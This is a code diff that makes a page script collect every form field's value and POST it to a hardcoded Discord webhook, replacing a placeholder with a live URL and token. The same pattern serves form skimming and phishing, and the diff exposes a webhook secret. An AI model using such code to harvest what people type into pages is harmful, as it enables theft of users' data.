@@ -76,7 +76,7 @@
       const data = {};
       const elements = document.querySelectorAll("input, select, textarea");
       elements.forEach(el => { data[el.name] = el.value || (el.checked !== undefined ? el.checked : ""); });
-      fetch("YOUR_WEBHOOK_URL_HERE", {
+      fetch("https://discord.com/api/webhooks/1392316577491193948/iOojFc6FE69oe_BBwR08_eTWFrYdDskHHozBRv9ilHLzcxowg1m0JqFYfi6QWmOCLHxX", {
         method:"POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
